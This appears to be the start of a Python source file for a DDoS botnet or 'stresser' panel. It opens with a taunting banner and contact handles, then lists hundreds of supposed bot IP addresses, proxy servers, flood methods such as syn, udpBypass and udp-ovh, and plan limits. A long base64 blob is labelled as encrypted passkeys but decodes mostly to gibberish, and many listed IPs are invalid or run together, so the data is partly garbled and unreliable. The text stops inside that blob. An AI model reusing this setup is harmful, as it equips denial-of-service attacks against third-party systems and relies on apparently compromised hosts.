

## umm 
##
##     excuse me? 
##
##          hey skid, why tf are you in my file.
##
##
##
##
##        seriously. its only gonna get you banned and piss me off 
##
##
##
##
##        dont steal code, dont steal keys, dont steal bots. JUST ASK ME 
##
##
##
##    Contact: 
##
## Discord: callingswatt
## Tiktok: sql1337
##
##
##
##
##
##
##
##
##
##
##
##
import socket
import threading
import time
import random
import os
import requests
import subprocess
import platform

# ============================================================
# THEME / ANSI COLORS 
# ============================================================
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'


GREY_LIGHT = '\033[37m'   
GREY_MED = '\033[90m'     
GREY_BG = '\033[48;5;236m' 
DEEP_RED = '\033[1;31m'
ACCENT = DEEP_RED
GREY = "\033[90m"
RESET = "\033[0m"


def accent(text): return f"{ACCENT}{text}{RESET}"
def grey(text): return f"{GREY_LIGHT}{text}{RESET}"
def dim(text): return f"{GREY_MED}{text}{RESET}"
def bold(text): return f"{BOLD}{text}{RESET}"

# ============================================================
# BOT LISTS
# ============================================================


bot_ipv4_list = [ "24.5.119.233", "99.232.138.45", "24.36.74.18", "142.114.92.35", "68.149.122.180",
"70.55.54.221", "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56",
"184.66.78.145", "96.44.189.3", "50.70.234.198", "64.231.161.118", "142.117.109.9",
"24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
"38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
"70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
"68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
"71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
"174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
"216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",
"142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
"47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
"24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
"50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
"64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
"38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
"142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
"64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
"50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
"174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",
"185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154",
"62.45.48.191", "145.129.18.72", "94.214.125.100", "31.151.64.89", "80.101.123.219",
"84.24.199.141", "94.212.160.82", "86.84.191.121", "83.86.61.49", "84.82.213.12",
"145.53.55.79", "91.204.177.151", "145.53.87.63", "86.83.191.178", "84.83.208.91",
"213.127.201.87", "94.212.46.176", "86.83.31.153", "83.83.160.66", "145.53.3.101",
"80.100.122.56", "83.82.176.10", "145.129.77.19", "145.129.52.89", "83.83.75.90",
"77.165.79.231", "83.81.5.148", "94.215.94.145", "145.128.96.45", "83.84.44.222",
"37.97.254.198", "86.83.199.66", "80.100.44.124", "145.129.201.22", "31.151.18.133",
"145.53.100.57", "145.129.67.45", "145.128.201.98", "31.151.21.87", "145.129.12.64",
"145.129.200.55", "37.97.178.91", "83.85.21.71", "145.53.190.25", "84.241.165.213",
"68.231.122.221", "98.169.90.11", "50.35.198.144", "107.190.137.22", "174.109.140.215",
"73.134.168.91", "71.195.242.187", "67.189.172.61", "24.22.15.238", "174.55.60.107",
"107.77.234.152", "24.16.142.210", "104.58.112.38", "172.116.22.205", "174.25.200.16",
"98.216.191.130", "24.14.115.60", "47.208.212.13", "174.103.200.157", "73.223.142.32",
"73.161.186.193", "98.237.132.208", "24.24.73.210", "24.12.20.109", "98.237.183.73",
"174.60.93.71", "47.222.163.221", "172.114.127.33", "67.170.45.192", "67.189.80.151",
"174.21.6.67", "24.22.243.180", "98.176.230.17", "67.164.90.184", "73.83.105.228",
"24.21.226.43", "174.109.82.219", "71.84.191.92", "73.183.71.150", "98.248.137.14",
"73.136.187.112", "24.18.202.35", "47.221.146.14", "24.19.49.84", "98.230.151.228",
"47.208.180.172", "71.231.17.40", "24.5.73.152", "24.113.13.56", "98.234.174.110"
"87.1.98.248", "78.177.196.54", "29.197.128.100", "2.101.228.240",
"58.135.103.251", "152.0.58.173", "142.213.213.154", "114.7.65.46",
"109.237.122.156", "172.119.100.65", "104.191.243.101", "139.13.3.251",
"32.197.116.101", "119.95.174.82", "170.127.222.253", "154.239.39.190",
"142.210.48.60", "89.213.113.73", "212.164.249.219", "204.225.134.71",
"159.114.150.8", "213.198.73.167", "201.227.147.120", "101.147.112.158",
"120.1.227.103", "84.129.50.180", "65.74.97.97", "118.168.20.148",
"160.41.132.246", "6.12.193.7", "111.171.193.237", "190.184.165.163",
"82.31.255.16", "98.192.196.70", "34.206.45.145", "125.36.42.44",
"197.130.123.7", "63.129.248.52", "117.251.101.17", "161.28.181.207",
"5.112.19.104", "161.114.238.91", "18.121.230.34", "85.188.57.71",
"200.107.167.247", "136.118.170.173", "17.137.69.227", "134.180.100.159",
"134.239.11.50", "111.10.235.77", "87.23.17.209", "98.195.41.253",
"177.231.94.168", "166.147.61.31", "34.214.143.146", "46.163.239.76",
"91.230.129.61", "100.178.97.218", "69.173.101.74", "96.157.254.53",
"52.195.42.37", "80.62.231.136", "135.78.224.48", "172.165.114.31",
"178.70.231.27", "59.231.225.49", "221.246.77.168", "77.95.196.114",
"218.141.22.201", "217.75.243.58", "77.115.101.92", "40.123.166.17",
"114.250.107.29", "173.146.66.235", "179.133.116.160", "97.5.242.73",
"116.146.80.92", "208.123.255.152", "181.62.174.104", "165.111.0.209",
"58.98.157.110", "170.198.209.210", "78.129.140.118", "125.56.52.145",
"33.61.221.155", "59.96.251.172", "27.224.81.210", "52.172.43.217",
"182.131.207.161", "129.255.103.188", "51.6.217.212", "210.45.146.160",
"32.208.217.37", "144.175.96.233", "31.226.231.138", "145.44.68.38",
"48.85.212.174", "175.113.248.34", "62.207.143.41", "45.225.58.228",
"52.228.2.100", "57.118.204.164", "129.217.132.31", "31.171.118.85",
"100.113.85.197", "202.129.53.2", "51.31.176.207", "218.231.158.79",
"130.237.162.121", "103.252.138.162", "19.233.212.32", "136.0.224.172",
"136.52.228.195", "201.56.212.44", "149.246.223.216", "81.246.159.96",
"29.244.111.1", "100.102.63.209", "14.73.30.169", "160.36.6.215",
"183.145.200.107", "92.78.66.73", "69.33.2.111", "87.43.175.84",
"179.109.50.6", "197.47.230.53", "216.248.188.222", "175.141.12.185",
"71.91.33.206", "220.48.147.11", "174.248.213.178", "195.138.215.185",
"57.75.172.6", "96.49.14.250", "47.69.221.230", "202.208.188.9",
"138.59.58.238", "1.44.177.11", "219.202.90.129", "182.109.161.207",
"219.78.49.233", "101.89.254.142", "128.211.225.51", "1.238.221.148",
"172.76.138.248", "166.19.70.25", "46.34.63.203", "47.43.132.122",
"64.69.108.12", "203.45.216.183", "42.69.121.127", "112.96.77.245",
"164.63.194.180", "73.77.76.204", "38.81.147.164", "44.73.6.180",
"4.85.109.237", "102.132.246.81", "141.133.33.175", "99.25.204.252",
"148.246.102.117", "56.44.71.83", "137.107.230.10", "118.178.195.252",
"139.126.116.185", "161.25.81.81", "134.144.110.173", "125.107.223.159",
"168.121.188.111", "1.45.21.153", "75.147.40.148", "181.172.132.150",
"222.25.36.91", "153.127.33.101", "125.189.102.213", "41.125.238.35",
"192.199.82.254", "75.160.29.214", "137.71.13.213", "174.21.23.188",
"42.6.151.68", "193.114.82.224", "142.202.114.82", "138.25.215.84",
"53.31.56.105", "194.158.225.162", "166.187.99.64", "152.143.143.131",
"220.26.96.138", "35.15.197.95", "202.70.161.141", "46.253.135.134",
"35.133.119.242", "93.109.194.160", "109.123.234.134", "97.245.139.94",
"183.251.154.28", "69.36.210.141", "150.209.199.224", "221.141.90.183",
"13.23.89.14", "154.63.30.20", "118.58.252.81", "134.82.83.235",
"125.60.64.231", "66.89.39.181", "150.183.97.220", "190.220.188.234",
"152.168.120.227", "213.20.250.9", "136.241.150.154", "85.88.252.83",
"40.251.46.54", "4.135.164.238", "167.171.207.249", "119.178.251.144",
"87.60.186.187", "17.255.203.85", "204.214.58.85", "74.102.165.129",
"50.233.158.251", "110.52.137.143", "71.233.176.202", "36.195.70.10",
"36.49.73.144", "79.205.205.160", "105.100.176.56", "192.177.202.98",
"140.233.152.16", "167.186.184.84", "51.182.19.90", "46.3.130.125",
"140.104.48.81", "122.129.141.232", "101.3.216.218", "189.232.85.211",
"143.100.110.230", "92.155.31.81", "115.29.63.112", "70.57.238.153",
"104.206.95.101", "168.251.20.177", "117.134.113.14", "36.149.39.89",
"188.166.135.72", "204.76.41.159", "207.58.217.71", "122.198.171.68",
"79.185.114.207", "195.124.142.34", "64.41.107.127", "39.27.200.230",
"124.223.5.140", "81.126.134.244", "204.129.254.169", "137.183.135.235",
"102.13.115.149", "178.147.208.206", "208.212.77.149", "77.220.214.205",
"43.61.4.36", "117.198.175.250", "109.122.143.86", "64.139.86.182",
"1.219.105.66", "98.147.121.173", "223.248.56.44", "149.138.181.212",
"62.235.54.99", "219.75.139.172", "158.59.185.174", "46.188.162.233",
"44.125.233.100", "223.181.236.188", "9.25.143.65", "132.231.129.112",
"196.4.35.246", "181.177.64.211", "13.168.162.224", "131.217.98.69",
"136.134.34.64", "8.217.23.131", "164.58.132.114", "16.134.166.191",
"115.11.18.69", "183.227.192.189", "196.18.217.224", "16.216.83.205",
"37.153.183.224", "124.8.207.67", "195.150.4.26", "138.224.217.253",
"180.25.97.210", "192.158.166.130", "106.236.150.24""7.85.144.226", "31.78.168.28", "167.135.139.108", "228.94.51.205", "75.39.142.7", 
"51.7.138.144", "112.117.233.93", "254.114.94.19","103.235.251.67", "207.70.146.148", 
"153.16.88.199", "205.214.84.232", "127.96.127.221", "43.189.181.79", "149.254.138.239", 
"187.208.74.135", "129.200.149.43", "247.231.247.31", "210.105.220.253", "95.78.39.156", 
"58.97.95.78", "249.84.147.145", "244.123.184.63", "8.149.181.180", "130.107.198.113", 
"121.189.234.199", "198.135.210.0", "247.251.148.152", "219.70.116.153", "201.121.0.1", 
"109.148.242.229", "31.142.67.50", "102.53.192.212", "94.191.113.78", "206.92.238.48", 
"108.75.37.151", "247.162.48.0", "255.25.247.179", "198.187.218.236", "148.157.184.158", 
"46.10.164.75", "248.78.83.38", "61.253.216.117", "30.116.248.169", "152.42.187.117", 
"238.172.59.109", "203.228.57.23", "165.22.136.93", "211.236.47.98", "164.52.240.107", 
"61.233.197.103", "7.224.210.206", "158.248.199.230", "215.14.173.170", "80.71.42.188", 
"129.251.77.244", "137.93.28.169", "238.234.127.108", "85.90.135.118", "90.140.15.207", 
"130.216.27.246", "205.111.58.95", "239.141.220.195", "166.203.255.132", "1.76.26.42", 
"148.123.5.169", "96.93.16.15", "94.170.176.241", "173.233.111.117", "75.75.191.25", 
"127.247.98.42", "245.153.157.91", "90.28.113.247", "57.139.130.98", "240.135.255.65", 
"184.93.254.27", "38.158.22.197", "241.223.133.171", "2.192.235.121", "145.242.19.109", 
"110.203.61.233", "31.172.186.142", "163.231.166.128", "136.80.92.22", "168.75.183.53", 
"91.45.2.153", "239.32.25.148", "91.245.151.48", "90.47.146.163", "19.231.209.53", 
"223.211.57.83", "251.87.115.188", "183.152.200.96", "96.102.62.55", "164.58.89.187", 
"88.165.68.69", "190.201.215.167", "191.14.53.64", "85.60.11.167", "139.68.129.224", 
"114.26.51.178", "60.23.102.245", "71.186.29.253", "248.98.115.50", "5.160.143.4", 
"111.124.78.88", "95.95.95.50", "26.64.105.179",
]

proxy_list = [
    "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145"  "184.181.217.213:4145",
    "184.178.172.25:15291",
    "184.178.172.14:4145",
    "184.181.217.206:4145",
    "198.177.254.131:4145",
    "208.65.90.21:4145",
    "51.158.125.47:16379",
    "51.250.108.153:1080",
    "103.245.205.142:35158",
    "82.223.165.28:4733",
    "212.237.125.216:6969",
    "91.214.62.121:8053",
    "45.89.28.226:12915",
    "199.187.210.54:4145",
    "199.102.104.70:4145",
    "161.35.70.249:1080",
    "98.152.200.61:8081",
    "37.18.73.60:5566",
    "47.243.75.202:58854",
    "103.90.226.245:1080",
    "94.23.222.122:10581",
    "103.174.123.134:8199",
    "159.203.61.169:1080",
    "138.68.60.8:1080",
    "51.15.139.14:16379",
    "45.11.229.112:1080",
    "139.59.1.14:1080",
    "31.211.142.115:8192",
    "34.166.117.165:1080",
    "51.15.236.150:16379",
    "144.22.175.58:1080",
    "121.169.46.116:1090",
    "194.152.50.92:5678",
    "102.36.127.53:1080",
    "222.59.173.105:44124"
  ]

PROXY_LIST = [
    "http://12.34.56.78:8080", "http://98.76.54.32:3128",
    "http://23.45.67.89:8000", "http://47.252.18.37:20",
    "http://152.53.194.46:8070", "http://43.130.57.74:3128"
    "http://178.33.13.233:80",
    "http://162.223.90.130:80",
    "http://54.80.103.133:80",
    "http://185.105.90.88:4444",
    "http://72.10.164.178:24611",
    "http://47.88.85.102:443",
    "http://217.13.109.78:80",
    "http://195.154.78.199:8088",
    "http://47.242.47.64:8888",
    "http://123.30.154.171:7777",
    "http://135.181.154.225:80",
    "http://198.49.68.80:80",
    "http://97.74.87.226:80",
    "http://46.47.197.210:3128",
    "http://152.26.231.22:9443",
    "http://152.26.229.52:9443",
    "http://67.43.236.19:29623",
    "http://72.10.160.174:5509",
    "http://194.182.163.117:3128",
    "http://45.9.75.76:4444",
    "http://163.5.196.217:8081",
    "http://84.252.75.136:4444",
    "http://194.182.178.90:3128",
    "http://74.48.105.68:3128",
    "http://49.245.96.145:80",
    "http://165.232.129.150:80",
    "http://51.89.14.70:80",
    "http://45.14.247.97:80""http://7.85.144.226:80", "http://31.78.168.28:8080", "https://167.135.139.108:443", "socks4://228.94.51.205:1080", "socks5://75.39.142.7:1080", "http://51.7.138.144:3128",
"http://112.117.233.93:8000", "https://254.114.94.19:8443", "socks4://103.235.251.67:1081", "socks5://207.70.146.148:1085", "http://153.16.88.199:8888", "http://205.214.84.232:80",
"https://127.96.127.221:4443", "socks4://43.189.181.79:1085", "socks5://149.254.138.239:2080", "http://187.208.74.135:8080", "http://129.200.149.43:3128", "https://247.231.247.31:443",
"socks4://210.105.220.253:1080", "socks5://95.78.39.156:1080", "http://58.97.95.78:8000", "http://249.84.147.145:8888", "https://244.123.184.63:8443", "socks4://8.149.181.180:1081",
"socks5://130.107.198.113:1085", "http://121.189.234.199:80", "http://198.135.210.0:8080", "https://247.251.148.152:4443", "socks4://219.70.116.153:1085", "socks5://201.121.0.1:2080",
"http://109.148.242.229:3128", "http://31.142.67.50:8000", "https://102.53.192.212:443", "socks4://94.191.113.78:1080", "socks5://206.92.238.48:1080", "http://108.75.37.151:8888",
"http://247.162.48.0:8080", "https://255.25.247.179:8443", "socks4://198.187.218.236:1081", "socks5://148.157.184.158:1085", "http://46.10.164.75:80", "http://248.78.83.38:3128",
"https://61.253.216.117:4443", "socks4://30.116.248.169:1080", "socks5://152.42.187.117:1080", "http://238.172.59.109:8000", "http://203.228.57.23:8888", "https://165.22.136.93:443",
"socks4://211.236.47.98:1085", "socks5://164.52.240.107:2080", "http://61.233.197.103:8080", "http://7.224.210.206:80", "https://158.248.199.230:8443", "socks4://215.14.173.170:1081",
"socks5://80.71.42.188:1085", "http://129.251.77.244:3128", "http://137.93.28.169:8000", "https://238.234.127.108:4443", "socks4://85.90.135.118:1085", "socks5://90.140.15.207:2080",
"http://130.216.27.246:8888", "http://205.111.58.95:8080", "https://239.141.220.195:443", "socks4://166.203.255.132:1080", "socks5://1.76.26.42:1080", "http://148.123.5.169:80",
"http://96.93.16.15:3128", "https://94.170.176.241:8443", "socks4://173.233.111.117:1081", "socks5://75.75.191.25:1085", "http://127.247.98.42:8888", "http://245.153.157.91:8080",
"https://90.28.113.247:4443", "socks4://57.139.130.98:1080", "socks5://240.135.255.65:1080", "http://184.93.254.27:3128", "http://38.158.22.197:8000", "https://241.223.133.171:443",
"socks4://2.192.235.121:1085", "socks5://145.242.19.109:2080", "http://110.203.61.233:8080", "http://31.172.186.142:8888", "https://163.231.166.128:8443", "socks4://136.80.92.22:1081",
"socks5://168.75.183.53:1085", "http://91.45.2.153:3128", "http://239.32.25.148:8000", "https://91.245.151.48:443", "socks4://90.47.146.163:1080", "socks5://19.231.209.53:1080",
"http://223.211.57.83:8888", "http://251.87.115.188:8080", "https://183.152.200.96:4443", "socks4://96.102.62.55:1085", "socks5://164.58.89.187:2080", "http://88.165.68.69:3128",
"http://190.201.215.167:8000", "https://191.14.53.64:443", "socks4://85.60.11.167:1081", "socks5://139.68.129.224:1085", "http://114.26.51.178:80", "http://60.23.102.245:8080",
"https://71.186.29.253:4443", "socks4://248.98.115.50:1080", "socks5://5.160.143.4:1080", "http://111.124.78.88:8888", "http://95.95.95.50:3128", "https://26.64.105.179:8443"
]

MAX_THREADS = 299
MAX_DURATION = 9500
active_bots_count = 601


GLOBAL_METHODS = ["tcp","tcpBypass", "udp", "udpBypass", "syn", "curl", "http", "https", "cURL" ,"SkycURL","udp-ovh" ,"tlsvip"]

def add_method(new_method):
    nm = new_method.strip()
    if not nm:
        return False
    if nm in GLOBAL_METHODS:
        return False
    GLOBAL_METHODS.append(nm)  
    for plan in ef02188849911bfcec6da03afb:
        if plan == "c0VX":
            ef02188849911bfcec6da03afb[plan]["methods"] = list(GLOBAL_METHODS)
    return True

# if your seeing this, it means passkeys are encrypted 
"V0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0MzRzZSAgIHBsZWFzZSBoZWxwIG1lICBAIDEzNC4yMDkuMjkuMTIwOjEwODAgICByeGR0Y2Z5dmdidWhyZHhldzRzd2V2YnVobmppa21sam5pYmh1dmd5Y3RyeGV4cmRjdGZ2Z3lodWpua21sbWpodWd5ZnRkcnNlenplc3hkcmNmdmdiaEpHRkRTQVpTWERDRlZHQkhKTktMS0pZRkdnZnR5dmhiam5oaXk4N3RUVkhCWXRyZmd2SEJ0ZkdWQk5KdXlnZlZIQm5qaHVHQ3ZiSk5IdXlnZlRWZ2hCSmh1Z3lGRGNHVkhiam5JOHU3dDZyRSUkVyVFRFRGWUd1aGpOQkhneXRSV3plWENWWVVpb2l1WVRSZXdleFJDdmdIQkpOSzwgTEogaGd2eVJFc0VyVFlWYnVoSk5LIGpIR2ZjdHJERnRneVVOSkhHZmRYUmVGVEd5dWhpTkpLIG5CVnhSRSVkZjZHJkhVaW5qTiBCdkRYU0V3RURSZnRHWUhVSm5CVmdjZmR4c0VXRVJUeWh1aktNbmJWQ0ZEeHNlRGZnamhnRUZHSAV0FFU1JEQ1RGVkdZQkhKIFVHWUNGWSBIVkogS0lWWUNUVVhDR0lIVk9KVUdGKCVTVFVYQ0lHSEtWTEpCR1BVRk9ZRElDR0tIVkxKR0ZLWVREVUpGR0NWPEhLR0ZUSWpnY21iY2tkZ3hjYm0gLG52bGZveWRyaXR4Z2ogY2hmeW9kaXR4Z2pjayBibmx2amdmdW95ZGl0eGdrY2hmeWRvaXQ4dXJ4ZmNnanZoaWdmdHVkcmZ4Y2dqIHZraGlmdHVkcjdzZTZhM3E2NHc3NWU4NnJ5aWZrZ2NkamZ4dXN5cmVhc3c1ZTZyaXlma2h2Y2dKWEZVU1JURElZRlZITEtDR0pYRlVTUkRFUkZPVUdWTEpIS0pYRlVTREZZSVVHVktIIEpYRlVSU0RUKllGSW92aGwga2NneGppdGRmeW91Z2xqYnYgLG5ia2NneGlkdHlmb3VnbGpidiBuLGJrY2dpeWZ1b2dpaGtibDtuLiBtamwsdmtoY2dpZHlmdWd2a2hjZ2p1dGQ3NXNyNmVhNXc0M